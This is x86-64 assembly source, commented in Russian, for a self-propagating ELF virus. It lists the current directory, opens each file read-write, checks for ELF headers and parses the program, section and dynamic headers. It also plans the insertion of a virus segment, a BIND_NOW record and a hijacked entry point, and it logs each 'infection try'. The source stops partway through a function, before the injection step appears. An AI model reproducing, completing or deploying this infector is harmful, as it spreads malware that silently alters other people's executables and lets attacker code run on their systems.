    .text 0

    .global	_start
	.type	_start, @function

_start:
    leaq    _start_infector(%rip), %rsi
    jmp     *%rsi

/// Если эта переменная существует,
/// макросы будут генерировать отладочный вывод
    .set DEBUG_MODE, 1

#define CANARY_VAL 0xDEADBEEFBAADF00D

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                  jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm


    // Марос для проверки, не переполнен ли стек
    .macro CHECK_CANARY
        .ifdef DEBUG_MODE
            mov     _canary(%rip), %rax
            mov    $CANARY_VAL, %rbx
            cmp    %rax, %rbx
            je      1f              # forward label 1
            lea     2f(%rip), %rsi  # forward label 2
            mov     $len_e_canary_\@, %rdx
            jmp     _error_msg
        2:
            .string "ERR: canary \@\n"
            .set len_e_canary_\@, . - 2b
        1:
        .endif
    .endm


/// печать сообщения об ошибке и выход
/// из программы
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp    _restore_registers_and_stack

/// CONST--------------------------------------

    .set O_RDONLY, 0x0
    .set O_RDWR, 0x2
    .set MAP_PRIVATE, 0x2
    .set PROT_NONE, 0x0
    .set PROT_READ, 0x1
    .set PROT_WRITE, 0x2
    .set PROT_EXEC, 0x4
    .set PROT_READ_OR_PROT_WRITE, 0x3
    .set O_RDWR_AND_O_APPEND, 0x402

    .set ELF_E_ENTRY, 0x18
    .set ELF_E_PHOFF, 0x20
    .set ELF_E_SHOFF, 0x28
    .set ELF_E_PHNUM, 0x38
    .set ELF_E_SHNUM, 0x3c

    .set PHDR_P_OFFSET, 0x8
    .set PHDR_P_VADDR, 0x10
    .set PHDR_P_PADDR, 0x18
    .set PHDR_P_FILESZ, 0x20
    .set PHDR_P_MEMSZ, 0x28
    .set PHDR_P_ALLIGN, 0x30

    .set SHDR_SH_ADDR, 0x10
    .set SHDR_SH_TYPE, 0x4
    .set SHDR_SH_OFFSET, 0x18
    .set SHDR_SH_SIZE, 0x20

    .set FIRST_SEGM_VADDR, 0xB
    .set VIRUS_NEW_VADDR, 0x13
    .set OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN, 0x1b
    .set ORIG_E_ENTRY_VADDR, 0x23
    .set FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY, 0x2b
    .set VICTIM_CODE_OFFSET, 0x33
    .set NEW_BIND_NOW_FLAG_RECORD_SIZE, 0x3b
    .set DYNAMIC_REC_VADDR, 0x43
    .set DYNAMIC_REC_SZ, 0x4b
    .set DYNAMIC_RECORDS_OFFSET, 0x53

_msg_infection_success:
    .ascii " is successfully infected \n"

_msg_cur_infection:
    .ascii " file: infection try \n"

new_elf_file:
    .string "test_inf"

dir_name:
    .string "./"

mprotect_ok:
    .quad -1

parse_success:
    .quad -1

recount_success:
    .quad -1

get_virus_success:
    .quad -1

old_rsp:
    .quad 0     # вершина стека жертвы

old_rbx:
    .quad 0

old_rdx:
    .quad 0

old_rcx:
    .quad 0

old_rdi:
    .quad 0

old_rsi:
    .quad 0

old_r8:
    .quad 0

old_r9:
    .quad 0

old_r10:
    .quad 0

old_r11:
    .quad 0

old_r12:
    .quad 0

old_r13:
    .quad 0

old_r14:
    .quad 0

old_r15:
    .quad 0

_stack_top:
    .space 6000, 0

_stack_bottom:
    .quad 0

data_size:
    .quad 0x50

constant_value:
    .quad 0x38

clear_from:
    .quad 0

fd:
    .quad 0

interm_fd_file:
    .quad 0

file_offset:
    .quad 0

cur_filename:
    .quad 0

dir_buf:
    .space 8000, 0

dir_struct:
    .space 30, 0

dir_buf_ptr:
    .quad 0

file_name_ptr:
    .quad 0

string_length:
    .quad 0

victim_elf_addr:
	.quad 0

victim_phdr_table_addr:
	.quad 0

victim_phdr_table_size:
	.quad 0

victim_phdr_amount:
	.quad 0

victim_shdr_table_addr:
	.quad 0

victim_shdr_table_size:
	.quad 0

victim_shdr_amount:
    .quad 0

virus_new_vaddr:
    .quad 0

virus_new_phdr:
    .space 0x38, 0

virus_new_shdr:
    .space 0x40, 0

bind_now_flag_record:
    .space 0x10, 0

last_seg_vaddr:
    .quad 0

last_seg_allign:
    .quad 0

victim_code_size:
    .quad 0

victim_code_addr:
    .quad 0

victim_code_frm_begin_vaddr:
    .quad 0

victim_code_offset:
    .quad 0

victim_code_before_bind_now_size:
	.quad 0

victim_code_after_bind_now_size:
	.quad 0

victim_code_before_bind_now_addr:
	.quad 0

victim_code_after_bind_now_addr:
	.quad 0

virus_code_addr:
	.quad 0

virus_code_size:
	.quad 0

symtab_shdr_addr:
	.quad 0

symtab_records_amount:
	.quad 0

dynamic_records_offset:
	.quad 0

dynamic_records_size:
	.quad 0

dynamic_records_vaddr:
    .quad 0

dynamic_records_addr:
    .quad 0

new_bind_now_flag_record_size:
    .quad 0

new_bind_now_record_frm_dynamic_offset:
	.quad 0

original_e_entry:
	.quad 0

offset_to_e_entry:
	.quad 0

move_victim_offset:
    .quad 0

offset_to_e_entry_frm_file_begin:
	.quad 0

frm_orig_e_entry_to_virus_e_entry_offset:
    .quad 0

offset_to_vict_code_frm_file_begin:
    .quad 0

sh_name_indx:
    .long 0

first_seg_vaddr:
	.quad 0

first_seg_addr:
	.quad 0

GOT_vaddr:
	.quad 0

GOT_size:
	.quad 0

GOT_addr_in_memory:
    .quad 0

rela_section_offset:
    .quad 0

rela_section_size:
    .quad 0

data_block:
    .space 0x50, 0

cur_seg_addr:
    .quad 0

cur_seg_end_addr:
    .quad 0

cur_seg_hdr_ptr:
    .quad 0

cur_seg_memsz:
    .quad 0

clear_to:
    .quad 0

/// Разрешает коду вируса писать
/// в самого себя
_allow_write_into_code:
    push    %rdx
    push    %rcx
    push    %rdi
    push    %rsi

    lea     _start(%rip), %rdi
    and     $~0xFFF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr

    sub     %rdi, %rsi          # total size - %RSI
    mov     $0x7, %rdx          # RW+EXEC flags - $RDX
    mov     $0xA, %rax          # mprotect handle
    syscall

    test    %rax, %rax
    jne     _allow_write_into_code_error

    mov     %rax, mprotect_ok(%rip)
_allow_write_into_code_exit:
    pop     %rsi
    pop     %rdi
    pop     %rcx
    pop     %rdx

    ret

    ERR_MSG _allow_write_into_code "mprotect in _start"

/// Сохраняет все регистры кроме rax -
/// он уже изменен - в переменные и
/// настраивает стек
/// Проверяет MPROTECT_OK
_save_registers:
    mov     mprotect_ok(%rip), %rax
    test    %rax, %rax
    jne     _save_registers_fail

    mov     %rsp, old_rsp(%rip)
    lea     _stack_bottom(%rip), %rsp

    mov     %rbx, old_rbx(%rip)
    mov     %rdx, old_rdx(%rip)
    mov     %rcx, old_rcx(%rip)
    mov     %rdi, old_rdi(%rip)
    mov     %r8, old_r8(%rip)
    mov     %r9, old_r9(%rip)
    mov     %r10, old_r10(%rip)
    mov     %r11, old_r11(%rip)
    mov     %r12, old_r12(%rip)
    mov     %r13, old_r13(%rip)
    mov     %r14, old_r14(%rip)
    mov     %r15, old_r15(%rip)

    xor     %rax, %rax
    jmp     _save_registers_exit

_save_registers_fail:
    mov     $-1, %rax

_save_registers_exit:
    jmp     _prepare_data

/// Очищает данные о секции dynamic,
/// GOT, и записи BIND_NOW
_clear_old_data:
    push    %rbx
    leaq    clear_from(%rip), %rax
    leaq    clear_to(%rip), %rbx

    mov     %rbx, clear_to(%rip)
    mov     %rax, clear_from(%rip)

    call    _clear_array

    movq    $-1, parse_success(%rip)
    movq    $-1, get_virus_success(%rip)
    movq    $-1, recount_success(%rip)

    xor     %rax, %rax
    jmp     _clear_old_data_exit

_clear_old_data_fail:
    mov     $-1, %rax

_clear_old_data_exit:
    pop    %rbx
    ret

/// Открывает директорию
/// и считывает все ее записи в буфер
_my_readdir:
    push    %rdi
    push    %rsi
    push    %rbx

    // открыть директорию
    lea     dir_name(%rip), %rdi
    mov     $0x0, %rsi
    mov     $0x2, %rax  # fopen syscall
    syscall
    test     %rax, %rax
    jl      _my_readdir_open_error

    // заполянем структуру потока
    lea     dir_struct(%rip), %rbx
    mov     %eax, (%rbx)
    movq    $0x8000, 0x8(%rbx) # размер буфера


    // параметры getdents
    mov     (%rbx), %rdi
    lea     dir_buf(%rip), %rsi
    mov     8(%rbx), %rdx

    // вызов getdents
    mov    $0x4e, %rax
    syscall

    // в случае успеха возвращ.
    // кол-во считанных байт
    // иначе 0
    cmp     $0x0, %rax
    jle     _my_readdir_read_error

    // сохранили указатель на первую структуру
    // в буфере
    lea     dir_buf_ptr(%rip), %rbx
    mov     %rsi, (%rbx)

    xor     %rax, %rax
    pop     %rbx
    pop     %rsi
    pop     %rdi
    ret

    ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
    ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"


/// Проверяет: указатель на текущую запись
/// Успех: заполняет cur_filename указателем на
/// имя и возвращает 0 в rax
/// Фейл: заполняет cur_filename нулем и
/// возвращает -1 в rax
_get_file_name:
    push    %rbx
    push    %rcx

    // указатель не нулевой?
    mov     dir_buf_ptr(%rip), %rbx
    test    %rbx, %rbx
    je      _get_file_name_fail

    // получили имя
    lea     0x12(%rbx), %rax
    mov     %rax, file_name_ptr(%rip)
    mov     (%rax), %rax
    test    %rax, %rax
    je      _get_file_name_error


    xor     %rcx, %rcx
    // получили размер текущей структуры
    // (он меняется)
    movzwl  0x10(%rbx), %ecx
    // сдвинули указатель на
    // следующую структуру
    add     %rcx, %rbx

    mov     %rbx, dir_buf_ptr(%rip)
    xor     %rax, %rax
    jmp    _get_file_name_exit
_get_file_name_fail:
    mov     $-1, %rax
    movq    $0x0, file_name_ptr(%rip)

_get_file_name_exit:
    pop     %rcx
    pop     %rbx
    ret

    ERR_MSG _get_file_name "get_file_name: No files in directory any more"

/// _CLEAR_ARRAY
/// Заполняет все нулями
/// с точки from до точки to
_clear_array:
    push    %rcx

    mov     clear_from(%rip), %rax
    test    %rax, %rax
    je      _clear_array_fail

    mov     clear_to(%rip), %rcx
    test    %rcx, %rcx
    je      _clear_array_fail

    sub     %rax, %rcx
_clear_array_cycle:
    movb    $0x0, (%rax)
    inc     %rax
    loop    _clear_array_cycle

_clear_array_success:
    xor     %rax, %rax
    jmp     _clear_array_exit

_clear_array_fail:
    mov     $-1, %rax

_clear_array_exit:
    pop     %rcx
	ret


/// _MY_STRLEN
/// PARAMS -
/// RDI - указатель на строку
/// Изменяет STRING_LENGTH
_my_strlen:
    xor     %rax, %rax

    push    %rcx
    push    %rbx

    test    %rdi, %rdi
    je      _my_strlen_fail
    // je      _my_strlen_error

    mov     $0x64, %rcx
    repne   scasb

    mov     $0x64, %rbx
    sub     %rcx, %rbx
    mov     %rbx, %rax
    dec     %rax

    mov     %rax, string_length(%rip)
    xor     %rax, %rax

    jmp    _my_strlen_exit

_my_strlen_fail:
    mov     $-1, %rax

_my_strlen_exit:
    pop     %rbx
    pop     %rcx

    ret

    ERR_MSG _my_strlen "_my_strlen: NULL pointer"

/// WRITE TO STDOUT
/// @PARAMS
///   - %RSI - msg pointer
///   - %RDX - msg size
_my_write:
    mov      $0x1, %rax          # write
    mov      %rax, %rdi          # to stdout
    syscall
    ret

/// Печатает имя файла,
/// который пытается заразить вирус в
/// данный момент
_print_infection_log:
    push     %rsi
    push     %rdi
    push     %rdx

    mov      file_name_ptr(%rip), %rsi
    test     %rsi, %rsi
    je       _print_infection_log_fail

    mov      file_name_ptr(%rip), %rdi
    call     _my_strlen

    mov      string_length(%rip), %rdx
    test     %rdx, %rdx
    je       _print_infection_log_fail

    call    _my_write

    lea     _msg_cur_infection(%rip), %rsi
    mov     $0x16, %rdx
    call    _my_write

    xor     %rax, %rax
    jmp     _print_infection_log_exit
_print_infection_log_fail:
    mov     $-1, %rax

_print_infection_log_exit:
    pop     %rdx
    pop     %rdi
    pop     %rsi
    ret

/// _PRINT_SUCCESS_INFECTION_MSG
/// Печатает вывод об успешном инфицировании файла
_print_success_infection_msg:
    push     %rsi
    push     %rdi
    push     %rdx

    mov      file_name_ptr(%rip), %rsi
    test     %rsi, %rsi
    je       _print_success_infection_msg_fail

    mov      file_name_ptr(%rip), %rdi
    call     _my_strlen

    mov      string_length(%rip), %rdx
    test     %rdx, %rdx
    je       _print_infection_log_fail

    call    _my_write

    lea     _msg_infection_success(%rip), %rsi
    mov     $0x1b, %rdx
    call    _my_write

    xor     %rax, %rax
    jmp     _print_success_infection_msg_exit

_print_success_infection_msg_fail:
    mov     $-1, %rax

_print_success_infection_msg_exit:
    pop     %rdx
    pop     %rdi
    pop     %rsi
    ret


/// OPENFILE
/// Открывает файл с указанными флагами,
/// маппит его в память
///
/// @PARAMS:
/// - %RDI - file name
/// - %RSI - flags
///
/// @RET:
/// - %RAX - указатель на файл в памяти
/// или отричательное значение
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax

    jl      _openfile_exit

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    # сохранить дескриптор жертвы
    mov     %rax, fd(%rip)

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    // leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    leaq    -0xD0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    // mov     -0x70(%rbp), %rsi   # filesz
    mov     -0xA0(%rbp), %rsi   # filesz
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    mov     $O_RDONLY, %rbx
    cmp     %rbx, %rax
    je      mmap_rdonly

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

mmap_rdwr:
    mov     $(PROT_READ | PROT_WRITE), %rdx # prot
    jmp     call_my_mmap

mmap_rdonly:
    mov     $PROT_READ, %rdx            # prot
    // call mmap
call_my_mmap:
    call    _my_mmap

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
	ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"


/// MY_MMAP file into memory
/// Считывает файл в память по заданному адресу.
/// Флаги должны быть такими же, какие передавали
/// open для открытия файла.
/// @PARAMS
///  - %RDI - адрес для записи (по умолчанию NULL,
///           в этом случае назначается OS)
///  - %RSI - длина считываемого файла
///  - %RDX - права доступа к памяти
///           (RDONLY, RDWR и т.д.)
///  - %RCX -  права для доступа к памяти для
///            процессов (MMAP_SHARED, MMAP_PRIVATE)
///  * %R8 -   fd считываемого файла
///  * %R9 -   offset от начала считываемого файла
/// @ RETURN VALUE
/// * RAX - указатель на файл в памяти или отриц. заначени
_my_mmap:
    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

	ret

/// MY_STAT
/// @PARAMS
/// %RDI - file name
/// %RSI - stat struct pointer
_my_stat:
    push    %rcx
    mov     $0x04, %rax

    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop     %rcx
  	ret

    ERR_MSG _my_stat "my_stat"

/// IS_IT_ELF
/// PARAMS
/// Проверяет наличие магических байт в
/// загруженном эльфе
/// Если магические байты есть, то
/// возвращает 1 в RAX
/// В противном случае - 0
magic_bytes_example:
    .quad 0x10102464c457f

_is_it_elf:
    push    %rdx
    push    %rbx
    push    %rsi
    push    %rcx

    mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _is_it_elf_fail

    movq    (%rbx), %rdx
    mov     magic_bytes_example(%rip), %rsi

    cmp     %rsi, %rdx
    jne     _is_it_elf_fail

    xor     %rax, %rax
    jmp     _is_it_elf_exit

_is_it_elf_fail:
    mov     $-1, %rax

_is_it_elf_exit:
    pop     %rcx
    pop     %rsi
    pop     %rbx
    pop     %rdx

    ret

/// Открывает файл и сохраняет его
/// адрес
_get_victim_addr:
    push    %rdi
    push    %rsi

    mov     file_name_ptr(%rip), %rdi
    mov     $O_RDWR, %rsi
    call    _openfile

    cmp     $0x0,  %rax
    jl      _get_victim_addr_fail

    mov     %rax, victim_elf_addr(%rip)
    xor     %rax, %rax
    jmp     _get_victim_addr_exit

_get_victim_addr_fail:
    mov     $-1, %rax

_get_victim_addr_exit:
    pop    %rsi
    pop    %rdi

    ret
/// получает данные о заголовках сегментов
/// жертвы:
/// - адрес заголовков в памяти
/// - количество
/// - суммарно занимаемая память
/// в случае провала возвращ. -1
_get_phdrs_info:
    push    %rdi
    push    %rsi
    push    %rcx
    push    %rdx

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _get_phdrs_info_fail

    mov     %rdi, %rsi
    mov     ELF_E_PHOFF(%rdi), %rcx
    add     %rcx, %rsi
    mov     %rsi, victim_phdr_table_addr(%rip)

    mov     ELF_E_PHNUM(%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, victim_phdr_amount(%rip)

    mov     $0x38, %rdx
    imul    %rcx,  %rdx
    mov     %rdx, victim_phdr_table_size(%rip)

    xor     %rax, %rax
    jmp     _get_phdrs_info_exit

_get_phdrs_info_fail:
    mov     $-1, %rax

_get_phdrs_info_exit:
    pop     %rdx
    pop     %rcx
    pop     %rsi
    pop     %rdi
    ret
/// получает данные о заголовках секций
/// жертвы:
/// - адрес заголовков в памяти
/// - количество
/// - суммарно занимаемая память
/// в случае провала возвращ. -1
_get_shdrs_info:
    push    %rdi
    push    %rsi
    push    %rcx
    push    %rdx

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _get_shdrs_info_fail
    mov     %rdi, %rsi

    mov     ELF_E_SHOFF(%rdi), %rcx
    add     %rcx, %rsi
    mov     %rsi, victim_shdr_table_addr(%rip)

    mov     ELF_E_SHNUM(%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, victim_shdr_amount(%rip)

    mov     $0x40, %rdx
    imul    %rcx,  %rdx
    mov     %rdx, victim_shdr_table_size(%rip)

    xor     %rax, %rax
    jmp     _get_shdrs_info_exit

_get_shdrs_info_fail:
    mov     $-1, %rax

_get_shdrs_info_exit:
    pop     %rdx
    pop     %rcx
    pop     %rsi
    pop     %rdi
    ret

/// Ищет и заполняет данные о
/// первом сегменте кода эльфа
_find_first_seg_vaddr:
    push    %rcx
    push    %r8

    mov     victim_phdr_table_addr(%rip), %r8
    mov     victim_phdr_amount(%rip), %rcx

    test    %r8, %r8
    je      _find_first_seg_vaddr_fail

    test    %rcx, %rcx
    je      _find_first_seg_vaddr_fail

    mov     %r8, %rdi

_find_first_seg_vaddr_cycle:
    cmp     $0x1, (%rdi)
    jne     _find_first_seg_vaddr_next

    cmp     $0x1, (%r8)
    jne     _set_first_seg

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jl      _set_first_seg
    jmp     _find_first_seg_vaddr_next

_set_first_seg:
    mov     %rdi, %r8

_find_first_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_first_seg_vaddr_cycle

_find_first_seg_vaddr_success:
    leaq    first_seg_vaddr(%rip), %rsi
    mov     PHDR_P_VADDR(%r8), %rdi
    mov     %rdi, (%rsi)

    leaq    first_seg_addr(%rip), %rsi
    mov     %r8, (%rsi)

    xor     %rax, %rax
    jmp    _find_first_seg_vaddr_exit

_find_first_seg_vaddr_fail:
    mov     $-1, %rax

_find_first_seg_vaddr_exit:
    pop     %r8
    pop     %rcx

    ret

/// _FIND_LAST_SEG_VADDR
/// Ищет виртуальный адрес последнего сегмента кода
_find_last_seg_vaddr:
    push    %rcx
    push    %r8
    push    %rdi
    push    %rsi

    mov     victim_phdr_table_addr(%rip), %r8
    mov     victim_phdr_amount(%rip), %rcx

    test    %r8, %r8
    je      _find_last_seg_vaddr_fail

    test    %rcx, %rcx
    je      _find_last_seg_vaddr_fail

    mov     %r8, %rdi
_find_last_seg_vaddr_cycle:

    cmp     $1, (%rdi)
    jne     _find_last_seg_vaddr_next

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jg      _set_last_seg
    jmp     _find_last_seg_vaddr_next

_set_last_seg:
    mov     %rdi, %r8

_find_last_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_last_seg_vaddr_cycle

_find_last_seg_vaddr_success:
    leaq    last_seg_vaddr(%rip), %rsi

    mov     PHDR_P_VADDR(%r8), %rax
    mov     PHDR_P_ALLIGN(%r8), %rcx

    mov     %rax, (%rsi)
    leaq    last_seg_allign(%rip), %rsi
    mov     %rcx, (%rsi)

    xor     %rax, %rax
    jmp     _find_last_seg_vaddr_exit

_find_last_seg_vaddr_fail:
    mov     $-1, %rax

_find_last_seg_vaddr_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rcx
    ret

/// _FIND_DYNAMIC
/// Ищет заголовок секции dynamic
/// Если находит, то заполняет данные о секции
_find_dynamic:
    push    %rcx
    push    %rdx
    push    %rdi

    mov     victim_shdr_table_addr(%rip), %rdi
    mov     victim_shdr_amount(%rip), %rcx

    test   %rdi, %rdi
    je      _find_dynamic_fail

    test   %rcx, %rcx
    je     _find_dynamic_fail

_find_dynamic_cycle:
    mov     SHDR_SH_TYPE(%rdi), %rdx
    cmp     $0x6, %dl   # shdr = dynamic?
    je      _find_dynamic_success

    add     $0x40, %rdi
    loop    _find_dynamic_cycle
    jmp     _find_dynamic_fail

_find_dynamic_success:
    mov     SHDR_SH_ADDR(%rdi), %rdx
    mov     %rdx, dynamic_records_vaddr(%rip)   # dynamic sh_vaddr

    mov     SHDR_SH_OFFSET(%rdi), %rdx
    mov     %rdx, dynamic_records_offset(%rip)   # dynamic sh_offset

    mov     victim_elf_addr(%rip), %rcx
    add     %rdx, %rcx
    mov     %rcx, dynamic_records_addr(%rip)

    mov     SHDR_SH_SIZE(%rdi), %rdx
    mov     %rdx, dynamic_records_size(%rip)   # dynamic size

    xor     %rax, %rax
    jmp     _find_dynamic_exit

_find_dynamic_fail:
    mov     $-1, %rax

_find_dynamic_exit:
    pop     %rdi
    pop     %rdx
    pop     %rcx

    ret

/// _FIND_BIND_NOW_RECORD
/// PARAMS
/// Проверяет, есть ли у секции dynamic
/// запись BIND_NOW
/// Если таковой записи нет, то:
/// - высчитываем смещение от начала секции dynamic,
/// по которому будет лежать эта запись (по умолчанию перед
/// записью NULL)
/// - устанавливаем размер будущей новой записи (это нужно, чтоб
/// корректно пересчитывать смещения всех заголовков в будущем)
_find_bind_now_record:
    push    %rdx
    push    %rcx
    push    %r8
    push    %rdi
    push    %rsi

    mov    dynamic_records_offset(%rip), %rdx
    test   %rdx, %rdx
    je      _find_bind_now_record_fail

    mov     dynamic_records_size(%rip),%rax
    test    %rax, %rax
    je      _find_bind_now_record_fail

    // адрес секции dynamic в памяти
    mov    victim_elf_addr(%rip), %rdi
    add    %rdx, %rdi

    mov     %rdi, %r8

    // установили счетчик цикла
    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx
    mov     %eax, %ecx

_find_bind_now_record_cycle:
    // запсиь BIND_NOW?
    cmpq    $0x18, (%rdi)
    je      _bind_now_record_exist

    // запись NULL?
    cmp     $0x0, (%rdi)
    // запись NULL всегда последняя,
    // так что дальше проверять не имеет смысла
    je      _no_bind_now_record_exist

    add     $0x10, %rdi
    loop    _find_bind_now_record_cycle

    jmp     _no_bind_now_record_exist

_bind_now_record_exist:
    //  обнуили размер новой записи - ее же не будет
    movb    $0x0, new_bind_now_flag_record_size(%rip)
    xor     %rax, %rax

    jmp     _find_bind_now_record_exit

    // записи BIND_NOW нет - придется позже генерировать новую
_no_bind_now_record_exist:
    movb    $0x10, new_bind_now_flag_record_size(%rip)

    // посчитали смещение от начала секции dynamic
    // до места, куда будем вписывать новую запись
    sub     %r8, %rdi
    mov     %rdi, new_bind_now_record_frm_dynamic_offset(%rip)

    xor     %rax, %rax
    jmp     _find_bind_now_record_exit

_find_bind_now_record_fail:
    mov     $-1, %rax

_find_bind_now_record_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rcx
    pop     %rdx

    ret

/// _GET_VICTIM_WHOLE_CODE_ADDR_AND_SIZE
/// Высчитывает адрес и размер всего кода жертвы,
/// если мы не генерируем запись BIND_NOW
_get_victim_whole_code_addr_and_size:
    push    %rcx
    push    %rdx

    // проверяем наличие всех необходимых данных
    // мы генерируем новыую запись BIND_NOW?
    // если да, то этот метод вычисления размера и адреса
    // кода жертвы нам не подходит
    mov     new_bind_now_flag_record_size(%rip), %rcx
    test    %rcx, %rcx
    jne     _get_victim_whole_code_addr_and_size_fail

    mov     victim_phdr_table_size(%rip), %rcx
    test    %rcx, %rcx
    je      _get_victim_whole_code_addr_and_size_fail

    mov     victim_phdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_whole_code_addr_and_size_fail

    mov     victim_shdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_whole_code_addr_and_size_fail

    // вычисляем размер и адрес кода жертвы
    leaq    victim_code_offset(%rip), %rdx
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)

    // считаем адрес кода жертвы
    mov     victim_phdr_table_addr(%rip), %rdx
    add     %rdx, %rcx
    mov     %rcx, victim_code_addr(%rip)

    // считаем  размер кода жертвы
    mov     victim_shdr_table_addr(%rip), %rdx
    sub     %rcx, %rdx
    mov     %rdx, victim_code_size(%rip)

    xor     %rax, %rax
    jmp     _get_victim_whole_code_addr_and_size_exit

_get_victim_whole_code_addr_and_size_fail:
    mov     $-1, %rax

_get_victim_whole_code_addr_and_size_exit:
    pop     %rdx
    pop     %rcx

    ret


/// _GET_VICTIM_CODE_ADDR_AND_SIZE_WITH_BIND_NOW
/// Если мы вставляем запись BIND_NOW,
/// то высчитываем:
/// - адрес и размер кода жертвы от его начала до
///   места вставки BIND_NOW
/// - адрес и размер кода жертвы от места вставки BIND_NOW
///   и до его конца
_get_victim_code_addr_and_size_with_bind_now:
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi

    // вставляем BIND_NOW?
    mov     new_bind_now_flag_record_size(%rip), %rcx
    test    %rcx, %rcx
    je     _get_victim_code_addr_and_size_with_bind_now_fail

    // проверка необходимых данных для высчитывания
    mov     victim_phdr_table_size(%rip), %rcx
    test    %rcx, %rcx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     victim_phdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     victim_shdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     victim_shdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov      dynamic_records_offset(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     new_bind_now_record_frm_dynamic_offset(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    // если все данные на месте, начинаем считать
    mov     victim_phdr_table_size(%rip), %rcx
    leaq    victim_code_offset(%rip), %rdx
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)   # save victim begin code offset

    mov     victim_phdr_table_addr(%rip), %rdx
    add     %rdx, %rcx

    // сохранили адрес начала кода
    mov     %rcx, victim_code_before_bind_now_addr(%rip)

    mov     dynamic_records_offset(%rip), %rdi
    mov     new_bind_now_record_frm_dynamic_offset(%rip), %rsi
    add     %rdi, %rsi  # offsetnew bind_now record frm file begin

    mov     victim_elf_addr(%rip), %rdx
    add     %rsi, %rdx

    // высчитали адрес кода от места вставки
    mov     %rdx,  victim_code_after_bind_now_addr(%rip)
    sub     %rcx, %rdx
    // высчитали размер кода от начала до вставки
    mov     %rdx, victim_code_before_bind_now_size(%rip)

    // высчитали размер кода от вставки до конца
    mov     victim_code_after_bind_now_addr(%rip), %rsi
    mov     victim_shdr_table_addr(%rip), %rdx
    sub     %rsi, %rdx
    mov     %rdx, victim_code_after_bind_now_size(%rip)

    xor     %rax, %rax
    jmp     _get_victim_code_addr_and_size_with_bind_now_exit
_get_victim_code_addr_and_size_with_bind_now_fail:
    xor     $-1, %rax

_get_victim_code_addr_and_size_with_bind_now_exit:
    pop     %rsi
    pop     %rdi
    pop     %rdx
    pop     %rcx

    ret

/// _FIND_VICTIM_TEXT_SECTION
/// находит секцию text для заражения -
/// этот сегмент содержит e_entry
// Как понять, что сегмент содержит e_entry:
// его sh_addr <= e_entry,
// его sh_addr + sh_size > e_entry
/// Этот заголовко секции  нужен, чтоб прочитать его sh_name -
/// индекс в таблице строк, его же присвоим новому заголовку
/// секции вируса

    .globl  _find_victim_text_section
	.type	_find_victim_text_section, @function
_find_victim_text_section:
    push    %rbx
    push    %rcx
